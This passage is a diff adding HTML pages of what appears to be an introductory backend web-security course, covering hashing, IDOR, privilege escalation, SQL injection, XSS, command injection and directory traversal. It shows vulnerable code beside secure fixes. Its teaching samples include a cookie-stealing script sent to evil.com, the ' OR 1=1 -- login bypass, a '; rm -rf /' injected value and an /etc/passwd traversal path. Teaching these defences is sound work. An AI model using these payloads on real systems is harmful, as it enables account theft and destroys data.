+        <div class="flow-label-top">HOW SESSION MANAGEMENT SOLVES STATELESSNESS</div>
+        <div class="flow-row">
+          <div class="flow-node cyan">User Logs In</div>
+          <div class="flow-arrow">--&gt;</div>
+          <div class="flow-node green">Server Creates Token</div>
+          <div class="flow-arrow">--&gt;</div>
+          <div class="flow-node">Browser Stores Token</div>
+        </div>
+        <div class="flow-down">|</div>
+        <div class="flow-row">
+          <div class="flow-node">Next Request + Token</div>
+          <div class="flow-arrow">--&gt;</div>
+          <div class="flow-node cyan">Server Reads Token</div>
+          <div class="flow-arrow">--&gt;</div>
+          <div class="flow-node green">Recognizes You</div>
+        </div>
+      </div>
+
+      <div class="divider"></div>
+
+      <h2 class="section-title">1.4 -- The Hacker's Mindset: What Is an Attack Surface?</h2>
+      <p>An <strong>attack surface</strong> is every point in your application where an attacker could potentially interact with it. Think of it as every door, window, skylight, and air vent in a building. The more openings you have, the more chances there are for a break-in.</p>
+      <p>Common backend attack surfaces include:</p>
+      <ul class="bullet-list">
+        <li>The login form (username and password fields)</li>
+        <li>Search bars and query inputs</li>
+        <li>File upload endpoints</li>
+        <li>URL parameters (example.com/user?id=42)</li>
+        <li>API endpoints that accept data from the outside world</li>
+        <li>Password reset flows</li>
+        <li>User profile editing forms</li>
+      </ul>
+      <div class="warning-box">
+        <div class="warning-label">Security Mindset</div>
+        <p>Every input field is a potential injection point. Every API endpoint that accepts data from the outside is a potential target. Developers who think like this from day one build far more secure systems.</p>
+      </div>
+
+    </div>
+    <div class="page-footer">
+      <div class="page-number">Page 1 &nbsp;|&nbsp; Chapter 01: Web Foundations &amp; HTTP</div>
+      <div class="page-nav">
+        <a href="#overview">&lt;-- Overview</a>
+        <a href="#ch2">Chapter 02 --&gt;</a>
+      </div>
+    </div>
+  </div>
+
+  <!-- ===================== PAGE 2: AUTHENTICATION ===================== -->
+  <div class="page" id="ch2">
+    <div class="page-header">
+      <div class="page-eyebrow">Chapter 02 -- Page 2 of 10</div>
+      <div class="page-title">Authentication <span>&amp; Password Security</span></div>
+      <div class="page-subtitle">Proving who you are -- and why doing it wrong is catastrophic.</div>
+    </div>
+    <div class="page-body">
+
+      <div class="code-prep">
+        <div class="code-prep-label">Coding Prep Mission -- Day 3 to 4</div>
+        <div class="code-prep-title">Learn: Strings &amp; String Manipulation in Python</div>
+        <ul>
+          <li>Creating strings: name = "Alice"</li>
+          <li>Joining strings (concatenation): "Hello " + name</li>
+          <li>String methods: .lower(), .upper(), .strip(), .replace()</li>
+          <li>F-strings for formatting: f"Hello {name}"</li>
+          <li>Finding the length: len(name)</li>
+        </ul>
+        <div class="why">WHY THIS MATTERS: Passwords are strings. When a hacker injects an attack, they do it by manipulating strings. When we hash a password, we transform a string. All of this chapter's security concepts involve understanding how strings are built, compared, and modified.</div>
+      </div>
+
+      <h2 class="section-title">2.1 -- The Problem With Plain Text Passwords</h2>
+      <div class="analogy">
+        <div class="analogy-label">Real-World Analogy -- The Open Library of Secrets</div>
+        <p>Imagine a library where everyone's diary is stored on an open shelf with no locks, no covers, nothing. If someone breaks into that library, they can read every single person's deepest secrets instantly. That is exactly what happens when a database stores passwords in plain text.</p>
+      </div>
+      <p>When a developer stores a password as-is (in plain text), the database contains readable passwords. If an attacker breaches that database, every single user's password is immediately available.</p>
+
+      <div class="flow">
+        <div class="flow-label-top">A DATABASE BREACH WITH PLAIN TEXT PASSWORDS</div>
+        <div class="flow-row">
+          <div class="flow-node red">Attacker Breaches DB</div>
+          <div class="flow-arrow">--&gt;</div>
+          <div class="flow-node red">Opens user table</div>
+          <div class="flow-arrow">--&gt;</div>
+          <div class="flow-node red">Reads passwords directly</div>
+          <div class="flow-arrow">--&gt;</div>
+          <div class="flow-node red">Logs into every account</div>
+        </div>
+      </div>
+
+      <div class="code-compare">
+        <div class="code-block bad">
+          <div class="code-block-label">!! VULNERABLE -- Never Do This !!</div>
+          <pre># Python pseudocode
+# Storing password directly
+def register_user(username, password):
+    db.insert({
+        "username": username,
+        "password": password  # PLAIN TEXT
+    })</pre>
+          <div class="code-note">If the database is breached, all passwords are exposed instantly. No protection whatsoever.</div>
+        </div>
+        <div class="code-block good">
+          <div class="code-block-label">-- SECURE -- Always Hash Passwords</div>
+          <pre># Python pseudocode using bcrypt
+import bcrypt
+
+def register_user(username, password):
+    hashed = bcrypt.hashpw(
+        password.encode('utf-8'),
+        bcrypt.gensalt()  # adds a unique salt
+    )
+    db.insert({
+        "username": username,
+        "password": hashed  # HASH stored, not password
+    })</pre>
+          <div class="code-note">Even if the database is breached, the attacker gets meaningless hashes. The real password is never stored.</div>
+        </div>
+      </div>
+
+      <div class="divider"></div>
+
+      <h2 class="section-title">2.2 -- Hashing &amp; Salting Explained</h2>
+      <div class="analogy">
+        <div class="analogy-label">Real-World Analogy -- The Paper Shredder with a Unique Spice</div>
+        <p>A hash function is like a paper shredder. You put your password in, it comes out as a pile of confetti that can never be reassembled. The SALT is a unique random ingredient added to the password BEFORE shredding. So even if two people both use the password "hello123", their confetti piles look completely different because each had a different spice added first.</p>
+      </div>
+      <p>Key hashing facts you must know:</p>
+      <ul class="bullet-list">
+        <li><strong>One-way</strong> -- you cannot reverse a hash back to the original password</li>
+        <li><strong>Deterministic</strong> -- the same input always produces the same output (without salt)</li>
+        <li><strong>Fixed length</strong> -- no matter how long your password is, the hash is always the same length</li>
+        <li><strong>Salt</strong> -- a random unique string added before hashing so identical passwords produce different hashes</li>
+      </ul>
+      <div class="warning-box">
+        <div class="warning-label">Rainbow Table Attack</div>
+        <p>Without salt, attackers pre-compute hashes for millions of common passwords (called a rainbow table). If your hash matches one in the table, they have your password instantly. Salt defeats this attack entirely because every hash is unique.</p>
+      </div>
+
+      <h3 class="sub-title">Live Demo: Password Hashing Simulator</h3>
+      <div class="simulator">
+        <div class="sim-label">Interactive Simulator</div>
+        <div class="sim-title">Type a password and see what hashing looks like</div>
+        <input class="sim-input" id="hash-input" type="text" placeholder="Type any password here..." value="mypassword123">
+        <br>
+        <button class="sim-btn" onclick="doHash()">Hash It</button>
+        <div class="sim-output" id="hash-output">Click "Hash It" to see the hashing in action.</div>
+      </div>
+
+      <div class="divider"></div>
+
+      <h2 class="section-title">2.3 -- Brute Force &amp; Dictionary Attacks</h2>
+      <div class="analogy">
+        <div class="analogy-label">Real-World Analogy -- The Locksmith with a Giant Key Ring</div>
+        <p>A brute force attack is like a locksmith who tries every single key on a giant ring, one by one, until one opens the door. A dictionary attack is smarter -- they try the most common passwords first (like "password", "123456", "qwerty") before trying random ones.</p>
+      </div>
+      <p>Defenses against brute force attacks:</p>
+      <ul class="bullet-list">
+        <li><strong>Account lockout</strong> -- lock the account after 5 failed attempts</li>
+        <li><strong>Progressive delays</strong> -- add increasing wait times after each failed attempt</li>
+        <li><strong>CAPTCHA</strong> -- verify that a human is trying, not an automated script</li>
+        <li><strong>Rate limiting on login</strong> -- limit how many login attempts per minute per IP address</li>
+        <li><strong>Alerting</strong> -- send an email notification after too many failed attempts</li>
+      </ul>
+
+      <div class="divider"></div>
+
+      <h2 class="section-title">2.4 -- Multi-Factor Authentication (MFA)</h2>
+      <div class="analogy">
+        <div class="analogy-label">Real-World Analogy -- The Bank Vault with Two Keys</div>
+        <p>Some bank vaults require two separate keys held by two different people. Even if one person is corrupt or their key is stolen, the vault cannot open without the second key. MFA works exactly this way. Even if your password is stolen, the attacker still cannot log in without your second factor (your phone, your fingerprint, or a hardware key).</p>
+      </div>
+      <p>Types of second factors, from weakest to strongest:</p>
+      <ul class="num-list">
+        <li><strong>SMS codes</strong> -- a 6-digit code sent to your phone. Convenient but vulnerable to SIM-swap attacks.</li>
+        <li><strong>TOTP (Authenticator Apps)</strong> -- a 6-digit code that changes every 30 seconds, generated by apps like Google Authenticator or Authy. Much more secure than SMS.</li>
+        <li><strong>Hardware keys (FIDO2 / WebAuthn)</strong> -- a physical USB device like a YubiKey. The most secure option available.</li>
+        <li><strong>Biometrics</strong> -- fingerprint or face recognition on your device.</li>
+      </ul>
+
+      <div class="flow">
+        <div class="flow-label-top">MFA LOGIN FLOW</div>
+        <div class="flow-row">
+          <div class="flow-node">User enters password</div>
+          <div class="flow-arrow">--&gt;</div>
+          <div class="flow-node cyan">Password correct</div>
+          <div class="flow-arrow">--&gt;</div>
+          <div class="flow-node yellow">MFA Prompt</div>
+          <div class="flow-arrow">--&gt;</div>
+          <div class="flow-node">TOTP Code entered</div>
+          <div class="flow-arrow">--&gt;</div>
+          <div class="flow-node green">Access Granted</div>
+        </div>
+      </div>
+
+    </div>
+    <div class="page-footer">
+      <div class="page-number">Page 2 &nbsp;|&nbsp; Chapter 02: Authentication &amp; Password Security</div>
+      <div class="page-nav">
+        <a href="#ch1">&lt;-- Chapter 01</a>
+        <a href="#ch3">Chapter 03 --&gt;</a>
+      </div>
+    </div>
+  </div>
+
+  <!-- ===================== PAGE 3: AUTHORIZATION ===================== -->
+  <div class="page" id="ch3">
+    <div class="page-header">
+      <div class="page-eyebrow">Chapter 03 -- Page 3 of 10</div>
+      <div class="page-title">Authorization <span>&amp; Sessions</span></div>
+      <div class="page-subtitle">Knowing who you are is only half the battle. What are you allowed to DO?</div>
+    </div>
+    <div class="page-body">
+
+      <div class="code-prep">
+        <div class="code-prep-label">Coding Prep Mission -- Day 5 to 6</div>
+        <div class="code-prep-title">Learn: JSON &amp; Dictionaries in Python</div>
+        <ul>
+          <li>Creating a dictionary: user = {"name": "Alice", "role": "admin"}</li>
+          <li>Accessing values: user["name"]</li>
+          <li>Nested dictionaries: {"user": {"id": 1, "permissions": ["read", "write"]}}</li>
+          <li>What JSON is (just a dictionary stored as text)</li>
+          <li>Converting between Python dicts and JSON: json.dumps() and json.loads()</li>
+        </ul>
+        <div class="why">WHY THIS MATTERS: Session tokens and JWTs are JSON objects. User permissions are dictionaries. IDOR attacks exploit how APIs look up items in a database using dictionary-style key lookups. Understanding objects and JSON is the master key to understanding every authorization vulnerability.</div>
+      </div>
+
+      <h2 class="section-title">3.1 -- Authentication vs Authorization</h2>
+      <div class="analogy">
+        <div class="analogy-label">Real-World Analogy -- The Concert Wristband</div>
+        <p>AUTHENTICATION is showing your ID at the concert gate to prove you are old enough to be there. AUTHORIZATION is the color of your wristband. A green wristband gets you into the general area. A gold wristband gets you backstage. A red wristband gets you into the VIP section. The gate checked WHO you are. The wristband controls WHERE you can go.</p>
+      </div>
+
+      <table class="data-table">
+        <thead><tr><th>Concept</th><th>Authentication</th><th>Authorization</th></tr></thead>
+        <tbody>
+          <tr><td><strong>Question</strong></td><td>Who are you?</td><td>What are you allowed to do?</td></tr>
+          <tr><td><strong>Mechanism</strong></td><td>Password, MFA, biometrics</td><td>Roles, permissions, ownership checks</td></tr>
+          <tr><td><strong>When it fails</strong></td><td>Wrong password, stolen token</td><td>User accesses data they should not see</td></tr>
+          <tr><td><strong>Example</strong></td><td>Logging into your bank</td><td>Only seeing your own bank statements</td></tr>
+        </tbody>
+      </table>
+      <div class="warning-box">
+        <div class="warning-label">Common Developer Mistake</div>
+        <p>Many developers check that a user is logged in (authentication) but forget to check whether that specific user is ALLOWED to access the specific resource they requested (authorization). This is the root cause of IDOR vulnerabilities.</p>
+      </div>
+
+      <div class="divider"></div>
+
+      <h2 class="section-title">3.2 -- Sessions vs JSON Web Tokens (JWTs)</h2>
+      <div class="analogy">
+        <div class="analogy-label">Analogy for Sessions -- The Restaurant Table Number</div>
+        <p>The server keeps a notebook: "Table 7 belongs to Alice, she ordered pasta at 8pm." Your browser only stores the table number (7). Every time you make a request, you show your table number, and the server looks it up in the notebook to remember everything about you.</p>
+      </div>
+      <div class="analogy">
+        <div class="analogy-label">Analogy for JWTs -- The Signed VIP Ticket</div>
+        <p>Your ticket contains your name, seat number, and VIP status, all printed on it. It also has a cryptographic signature from the venue. The bouncer does not need to call the box office to verify your ticket. They just verify the signature on it. All the information travels WITH you.</p>
+      </div>
+
+      <h3 class="sub-title">What a JWT Looks Like</h3>
+      <div class="code-single">
+<pre>eyJhbGciOiJIUzI1NiJ9.eyJ1c2VySWQiOjEyMywicm9sZSI6InVzZXIiLCJleHAiOjE3MDAwMDAwMDB9.abc123signature
+
+Three parts separated by dots:
+
+PART 1 (Header):  { "alg": "HS256" }       -- which signing algorithm
+PART 2 (Payload): { "userId": 123,          -- the actual data
+                    "role": "user",
+                    "exp": 1700000000 }      -- expiry timestamp
+PART 3 (Signature): HMACSHA256(             -- cryptographic proof
+                       base64(header) + "." + base64(payload),
+                       SECRET_KEY
+                    )</pre>
+      </div>
+
+      <div class="divider"></div>
+
+      <h2 class="section-title">3.3 -- IDOR / BOLA: The #1 API Vulnerability</h2>
+      <div class="analogy">
+        <div class="analogy-label">Real-World Analogy -- The Hotel Room Keycard Bug</div>
+        <p>You check into Room 101. The front desk gives you a keycard that just has "101" written on it. You notice it is a number. You scratch out "101" and write "102". The door to Room 102 opens. You can now access someone else's private room. That is exactly what IDOR (Insecure Direct Object Reference) is in software.</p>
+      </div>
+      <p>IDOR stands for Insecure Direct Object Reference. It is ranked as the #1 most critical API vulnerability by OWASP. It happens when an API exposes an internal identifier (like a user ID or document ID) and does not verify that the requesting user is actually authorized to access that specific record.</p>
+
+      <div class="code-compare">
+        <div class="code-block bad">
+          <div class="code-block-label">!! VULNERABLE -- No Ownership Check</div>
+          <pre># API endpoint: GET /api/invoices/{id}
+
+def get_invoice(invoice_id):
+    # Just fetches whatever ID is in the URL
+    invoice = db.query(
+        "SELECT * FROM invoices WHERE id = ?",
+        invoice_id
+    )
+    return invoice
+
+# Attacker changes URL from:
+#   /api/invoices/1001  (their invoice)
+# to:
+#   /api/invoices/1002  (someone else's invoice)
+# The server returns it with NO PROTECTION.</pre>
+          <div class="code-note">No check that the logged-in user actually owns invoice 1002. Any user can read any other user's invoices.</div>
+        </div>
+        <div class="code-block good">
+          <div class="code-block-label">-- SECURE -- Always Check Ownership</div>
+          <pre># API endpoint: GET /api/invoices/{id}
+
+def get_invoice(invoice_id, current_user):
+    invoice = db.query(
+        "SELECT * FROM invoices WHERE id = ?",
+        invoice_id
+    )
+    # CRITICAL: verify the logged-in user
+    # is the actual owner of this invoice
+    if invoice.user_id != current_user.id:
+        return error(403, "Forbidden")
+
+    return invoice  # only returned if owner</pre>
+          <div class="code-note">Every access is verified. Even if the attacker changes the ID in the URL, they will get a 403 Forbidden error.</div>
+        </div>
+      </div>
+
+      <div class="divider"></div>
+
+      <h2 class="section-title">3.4 -- Privilege Escalation</h2>
+      <div class="analogy">
+        <div class="analogy-label">Real-World Analogy -- The New Employee Who Walks Into the Boss's Office</div>
+        <p>A new intern walks into the CEO's office, sits in the chair, and starts signing contracts. Nobody stops them because nobody checks their badge before they enter. Privilege escalation is when a regular user tricks the system into giving them administrator-level powers.</p>
+      </div>
+      <p>There are two types:</p>
+      <ul class="bullet-list">
+        <li><strong>Vertical escalation</strong> -- a normal user gains admin privileges</li>
+        <li><strong>Horizontal escalation</strong> -- user A accesses user B's data (this is the IDOR case above)</li>
+      </ul>
+
+      <div class="code-compare">
+        <div class="code-block bad">
+          <div class="code-block-label">!! VULNERABLE -- Trusting Client-Submitted Role</div>
+          <pre"># Attacker sends this request body:
+# POST /api/register
+# { "username": "eve", "role": "admin" }
+
+def register(data):
+    # DANGER: using the role the client sent
+    db.insert({
+        "username": data["username"],
+        "role": data["role"]  # attacker put "admin" here!
+    })</pre>
+          <div class="code-note">Never trust anything the client sends about their own permissions. An attacker can send any value they want.</div>
+        </div>
+        <div class="code-block good">
+          <div class="code-block-label">-- SECURE -- Role Assigned Server-Side Only</div>
+          <pre"># Server ignores any role the client sends
+
+def register(data):
+    # Role is ALWAYS set by the server, never by client
+    db.insert({
+        "username": data["username"],
+        "role": "user"  # hardcoded default, always
+    })
+
+# To promote someone to admin:
+# only an existing admin can call a separate
+# admin-only endpoint to change the role in the DB</pre>
+          <div class="code-note">The client has zero control over their own permission level. Roles are always read from the database, never from the request.</div>
+        </div>
+      </div>
+
+    </div>
+    <div class="page-footer">
+      <div class="page-number">Page 3 &nbsp;|&nbsp; Chapter 03: Authorization &amp; Sessions</div>
+      <div class="page-nav">
+        <a href="#ch2">&lt;-- Chapter 02</a>
+        <a href="#ch4">Chapter 04 --&gt;</a>
+      </div>
+    </div>
+  </div>
+
+  <!-- ===================== PAGE 4: INJECTION ATTACKS ===================== -->
+  <div class="page" id="ch4">
+    <div class="page-header">
+      <div class="page-eyebrow">Chapter 04 -- Page 4 of 10</div>
+      <div class="page-title">Injection <span>Attacks</span></div>
+      <div class="page-subtitle">When user input becomes a weapon against your own server.</div>
+    </div>
+    <div class="page-body">
+
+      <div class="code-prep">
+        <div class="code-prep-label">Coding Prep Mission -- Day 7 to 9</div>
+        <div class="code-prep-title">Learn: Conditionals (if / else) and String Formatting in Python</div>
+        <ul>
+          <li>if / elif / else statements</li>
+          <li>Comparison operators: == != &gt; &lt; &gt;= &lt;=</li>
+          <li>Building strings with variables: "Hello " + name or f"Hello {name}"</li>
+          <li>Truthiness -- what values are considered True or False</li>
+        </ul>
+        <div class="why">WHY THIS MATTERS: Injection attacks work because code BLINDLY joins user-supplied text into sensitive commands (like SQL queries). Understanding how programs build strings from variables, and how if/else logic is evaluated, is the exact knowledge you need to understand WHY injection is so dangerous -- and how to fix it.</div>
+      </div>
+
+      <h2 class="section-title">4.1 -- SQL Injection (SQLi)</h2>
+      <div class="analogy">
+        <div class="analogy-label">Real-World Analogy -- The Poison Pizza Order</div>
+        <p>A pizza restaurant takes orders by phone and writes them word-for-word on a slip that goes to the kitchen. You call and say: "One Margherita. AND CANCEL ALL OTHER ORDERS." The kitchen follows the instructions literally, including the last part. SQL Injection is injecting your own commands into a database query by manipulating the input the server blindly concatenates into a query string.</p>
+      </div>
+
+      <h3 class="sub-title">How SQLi Works Step by Step</h3>
+      <p>A developer writes a login query by joining the user's input directly into a SQL string:</p>
+      <div class="code-single">
+<pre># VULNERABLE login query (Python pseudocode)
+username = request.get("username")  # user types: ' OR 1=1 --
+password = request.get("password")  # user types: anything
+
+query = "SELECT * FROM users WHERE username = '" + username + "' AND password = '" + password + "'"
+
+# The final query becomes:
+# SELECT * FROM users WHERE username = '' OR 1=1 --' AND password = 'anything'
+
+# Breaking it down:
+# '' OR 1=1   -- this is ALWAYS TRUE. Every user matches.
+# --           -- this comments out the rest of the query (the password check disappears)
+# Result: The server returns ALL users and the attacker is logged in as the first user (often admin)</pre>
+      </div>
+
+      <div class="code-compare">
+        <div class="code-block bad">
+          <div class="code-block-label">!! VULNERABLE -- String Concatenation</div>
+          <pre">query = "SELECT * FROM users " +
+        "WHERE username = '" + username +
+        "' AND password = '" + password + "'"
+
+# If username = ' OR 1=1 --
+# The password check is completely bypassed.
+# Attacker is logged in without a valid password.</pre>
+          <div class="code-note">User input is directly concatenated into the SQL query. The database cannot tell the difference between code and data.</div>
+        </div>
+        <div class="code-block good">
+          <div class="code-block-label">-- SECURE -- Parameterized Query</div>
+          <pre"># The ? marks are placeholders.
+# The database treats username and password
+# as DATA, never as executable code.
+
+query = "SELECT * FROM users WHERE username = ? AND password = ?"
+result = db.execute(query, [username, password])
+
+# Even if username = ' OR 1=1 --
+# The database treats it as a literal string value
+# and finds no user with that username.
+# Attack completely defeated.</pre>
+          <div class="code-note">Parameterized queries separate data from code. User input can never break out of its designated slot to become part of the SQL command.</div>
+        </div>
+      </div>
+
+      <h3 class="sub-title">Try the SQL Injection Simulator</h3>
+      <div class="simulator">
+        <div class="sim-label">Interactive Simulator</div>
+        <div class="sim-title">Type a username below. Try typing: ' OR 1=1 --</div>
+        <input class="sim-input" id="sqli-input" type="text" placeholder="Enter a username..." value="">
+        <br>
+        <button class="sim-btn" onclick="doSQLi()">Test Login</button>
+        <div class="sim-output" id="sqli-output">Enter a username above and click "Test Login" to see the SQL query that gets built.</div>
+      </div>
+
+      <div class="divider"></div>
+
+      <h2 class="section-title">4.2 -- Cross-Site Scripting (XSS)</h2>
+      <div class="analogy">
+        <div class="analogy-label">Real-World Analogy -- The Poisoned Bulletin Board</div>
+        <p>The school has a public bulletin board where students post notices. You post a fake notice that says "CLICK HERE FOR FREE PIZZA" -- but clicking it actually runs a script that steals every reader's locker combination. XSS is posting a malicious script into a website's content area so that when other users view the page, the script runs in THEIR browser and can steal their cookies, passwords, or session tokens.</p>
+      </div>
+      <p>There are three types of XSS:</p>
+      <ul class="bullet-list">
+        <li><strong>Stored XSS</strong> -- the malicious script is saved in the database (e.g., in a comment or user profile) and runs every time someone views that content</li>
+        <li><strong>Reflected XSS</strong> -- the script is embedded in a URL and runs when the victim clicks the link</li>
+        <li><strong>DOM-based XSS</strong> -- the script manipulates the page directly using JavaScript without ever going to the server</li>
+      </ul>
+
+      <div class="code-compare">
+        <div class="code-block bad">
+          <div class="code-block-label">!! VULNERABLE -- Raw HTML Insertion</div>
+          <pre">// JavaScript - inserting user content directly
+// User posted comment: &lt;script&gt;document.location='https://evil.com/steal?c='+document.cookie&lt;/script&gt;
+
+const commentDiv = document.getElementById("comments");
+commentDiv.innerHTML = userComment;
+// The script tag runs immediately.
+// Victim's session cookie is sent to the attacker.</pre>
+          <div class="code-note">innerHTML treats the input as HTML. Script tags inside it will execute. This is extremely dangerous.</div>
+        </div>
+        <div class="code-block good">
+          <div class="code-block-label">-- SECURE -- Text Content Only</div>
+          <pre">// Using textContent instead of innerHTML
+// The browser treats the entire value as plain text.
+// No HTML parsing, no script execution.
+
+const commentDiv = document.getElementById("comments");
+commentDiv.textContent = userComment;
+// Even if user typed a script tag, it will
+// be displayed as literal text, not executed.
+
+// Also add: Content-Security-Policy header
+// to restrict which scripts can run on the page.</pre>
+          <div class="code-note">textContent never interprets HTML. The malicious script tag is displayed as harmless text on screen.</div>
+        </div>
+      </div>
+
+      <div class="divider"></div>
+
+      <h2 class="section-title">4.3 -- OS Command Injection</h2>
+      <div class="analogy">
+        <div class="analogy-label">Real-World Analogy -- The Obedient Butler</div>
+        <p>You have a butler who follows every instruction literally without question. You tell them: "Fetch the file named 'report.txt' from the cabinet." They do it. But if you say: "Fetch 'report.txt' AND ALSO hand over all the master keys to the house" -- and the butler follows that too without questioning it -- that is OS command injection.</p>
+      </div>
+      <div class="code-compare">
+        <div class="code-block bad">
+          <div class="code-block-label">!! VULNERABLE -- User Input in Shell Command</div>
+          <pre"># User provides an IP address to ping
+ip_address = request.get("ip")  # attacker sends: "127.0.0.1; rm -rf /"
+
+import os
+os.system(f"ping -c 4 {ip_address}")
+
+# Actual command executed:
+# ping -c 4 127.0.0.1; rm -rf /
+# The semicolon lets the attacker chain a second command.
+# rm -rf / deletes the entire server filesystem.</pre>
+          <div class="code-note">Never pass user input directly into os.system() or any shell command. The results can be catastrophic.</div>
+        </div>
+        <div class="code-block good">
+          <div class="code-block-label">-- SECURE -- Parameterized subprocess Call</div>
+          <pre"># Use subprocess with a LIST of arguments
+# The user input is passed as DATA, not as shell code.
+import subprocess
+import re
+
+ip_address = request.get("ip")
+
+# Validate first: only allow valid IP format
+if not re.match(r'^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$', ip_address):
+    return error(400, "Invalid IP address")
+
+# Pass as a list - no shell interpretation
+result = subprocess.run(
+    ["ping", "-c", "4", ip_address],
+    capture_output=True, shell=False  # shell=False is critical
+)</pre>
+          <div class="code-note">The list format means ip_address can NEVER be interpreted as a command. shell=False prevents any shell interpretation.</div>
+        </div>
+      </div>
+
+      <div class="divider"></div>
+
+      <h2 class="section-title">4.4 -- Directory Traversal</h2>
+      <div class="analogy">
+        <div class="analogy-label">Real-World Analogy -- The Hidden Hotel Staircase</div>
+        <p>Hotel guests are only supposed to access their own floor. But there is a hidden staircase (represented by the characters "../") that bypasses the elevator and takes you directly to the restricted staff basement where all master records are stored. Directory traversal is using "../" sequences in a file request to escape the allowed directory and access files anywhere on the server.</p>
+      </div>
+      <div class="code-single">
+<pre"># The attack URL:
+# GET /files?name=../../../../etc/passwd
+
+# ../  means "go up one directory"
+# ../../../../  navigates 4 levels up to the root
+# /etc/passwd  is the Linux file containing all usernames
+
+# If the server blindly serves the file at:
+#   /app/uploads/ + "../../../../etc/passwd"
+# It resolves to:
+#   /etc/passwd  -- the system password file is now exposed</pre>
+      </div>
+      <div class="tip-box">
+        <div class="tip-label">How to Prevent Directory Traversal</div>
+        <p>Always resolve the full path of any user-supplied filename using a function like os.path.realpath() or Path.resolve(). Then verify the resolved path STARTS WITH the allowed base directory. If it does not, reject the request immediately without serving any file.</p>
+      </div>
+
+    </div>
+    <div class="page-footer">
+      <div class="page-number">Page 4 &nbsp;|&nbsp; Chapter 04: Injection Attacks</div>
+      <div class="page-nav">
+        <a href="#ch3">&lt;-- Chapter 03</a>
+        <a href="#ch5">Chapter 05 --&gt;</a>
+      </div>
+    </div>
+  </div>
+
+  <!-- ===================== PAGE 5: ENCRYPTION ===================== -->
+  <div class="page" id="ch5">
+    <div class="page-header">
+      <div class="page-eyebrow">Chapter 05 -- Page 5 of 10</div>
+      <div class="page-title">Data Protection <span>&amp; Encryption</span></div>
+      <div class="page-subtitle">Making your data unreadable to anyone who should not see it.</div>
+    </div>
+    <div class="page-body">
+
+      <div class="code-prep">
+        <div class="code-prep-label">Coding Prep Mission -- Day 10 to 12</div>
+        <div class="code-prep-title">Learn: Functions &amp; Parameters in Python</div>
+        <ul>
+          <li>Defining a function: def my_function(parameter):</li>
+          <li>Parameters and arguments -- how data is passed into functions</li>
+          <li>Return values: return result</li>
+          <li>Calling a function: result = my_function("input")</li>
+          <li>Default parameter values</li>
+        </ul>
+        <div class="why">WHY THIS MATTERS: Encryption is a mathematical function. You pass plaintext in, you get ciphertext back. Decryption is the reverse function. Every encryption library you will ever use works by calling functions with the right keys as parameters. Understanding functions IS understanding encryption at a conceptual level.</div>
+      </div>
+
+      <h2 class="section-title">5.1 -- Encryption at Rest vs Encryption in Transit</h2>
+      <div class="analogy">
+        <div class="analogy-label">Two Types of Protection</div>
+        <p>ENCRYPTION AT REST is like a locked safe in your home. Even if a burglar breaks in, they cannot open the safe. Your data is protected while it is just sitting there stored. ENCRYPTION IN TRANSIT is like an armored truck. The money is protected while moving between locations. Both are needed -- you cannot skip one and rely only on the other.</p>
+      </div>
+      <table class="data-table">
+        <thead><tr><th>Type</th><th>Protects Data When...</th><th>Technology</th><th>Example</th></tr></thead>
+        <tbody>
+          <tr><td><strong style="color:var(--cyan)">At Rest</strong></td><td>Stored on disk, in a database, or in backups</td><td>AES-256 encryption on disk</td><td>Encrypted database columns, encrypted S3 buckets</td></tr>
+          <tr><td><strong style="color:var(--green)">In Transit</strong></td><td>Traveling across a network between two systems</td><td>HTTPS / TLS</td><td>Browser to server, server to database</td></tr>
+        </tbody>
+      </table>
+
+      <div class="divider"></div>
+
+      <h2 class="section-title">5.2 -- Symmetric vs Asymmetric Encryption</h2>
+      <div class="analogy">
+        <div class="analogy-label">Symmetric -- One House Key</div>
+        <p>You and your friend both have identical copies of the same house key. Either of you can lock or unlock the door. It is fast and simple. But if one copy is stolen, the entire security model collapses. Symmetric encryption works this way -- the same key is used to both encrypt and decrypt data.</p>
+      </div>
+      <div class="analogy">
+        <div class="analogy-label">Asymmetric -- The Locked Dropbox</div>
+        <p>You publish a free padlock (your PUBLIC key) that anyone can use to lock a box and drop a secret inside. But only YOU have the key to open it (your PRIVATE key). Anyone can encrypt a message to you. Only you can decrypt it. This is asymmetric encryption.</p>
+      </div>
+      <table class="data-table">
+        <thead><tr><th>Property</th><th>Symmetric (AES)</th><th>Asymmetric (RSA / ECC)</th></tr></thead>
+        <tbody>
+          <tr><td><strong>Keys</strong></td><td>One shared key for both sides</td><td>Public key (encrypt) + Private key (decrypt)</td></tr>
+          <tr><td><strong>Speed</strong></td><td>Very fast -- used for bulk data</td><td>Slow -- used only for key exchange</td></tr>
+          <tr><td><strong>Problem</strong></td><td>How do you share the key securely?</td><td>Computationally expensive at scale</td></tr>
+          <tr><td><strong>Used for</strong></td><td>Encrypting files, databases</td><td>HTTPS handshake, digital signatures</td></tr>
+        </tbody>
+      </table>
+      <div class="tip-box">
+        <div class="tip-label">How HTTPS Combines Both</div>
+        <p>HTTPS uses asymmetric encryption to securely exchange a symmetric key, then uses that symmetric key for the rest of the conversation. This gives you the security of asymmetric (no key sharing problem) and the speed of symmetric (fast bulk encryption). This is called a TLS handshake.</p>
+      </div>
+
+      <div class="divider"></div>
+
+      <h2 class="section-title">5.3 -- HTTPS and TLS Certificates</h2>
+      <div class="analogy">
+        <div class="analogy-label">Real-World Analogy -- The Notarized Letter</div>
+        <p>A TLS certificate is like a letter notarized by a trusted authority. The letter says "I confirm this is Alice's website and it belongs to alice.com." The browser checks the notary's signature (from a Certificate Authority like DigiCert or Let's Encrypt). If the notary's signature is valid, the browser shows the green padlock. If something is wrong, it shows a security warning.</p>
+      </div>
+      <ul class="bullet-list">
+        <li><strong>Certificate Authority (CA)</strong> -- a trusted organization that issues and signs TLS certificates</li>
+        <li><strong>TLS Certificate</strong> -- a digital document proving a server is who it claims to be</li>
+        <li><strong>Self-signed certificate</strong> -- a certificate the server signed itself (not trusted by browsers)</li>
+        <li><strong>HSTS</strong> -- a header that tells the browser to ALWAYS use HTTPS, never downgrade to HTTP</li>
+      </ul>
+
+      <div class="divider"></div>
+
+      <h2 class="section-title">5.4 -- Secrets Management: Never Hardcode Credentials</h2>
+      <div class="analogy">
+        <div class="analogy-label">Real-World Analogy -- The Sticky Note on the Safe</div>
+        <p>Imagine writing your safe combination on a sticky note and sticking it to the door of the safe. That is exactly what hardcoding your database password into your source code and pushing it to GitHub is. The credentials are visible to anyone who reads the code -- including the entire internet if your repository is public.</p>
+      </div>
+      <div class="code-compare">
+        <div class="code-block bad">
+          <div class="code-block-label">!! WORST THING YOU CAN DO</div>
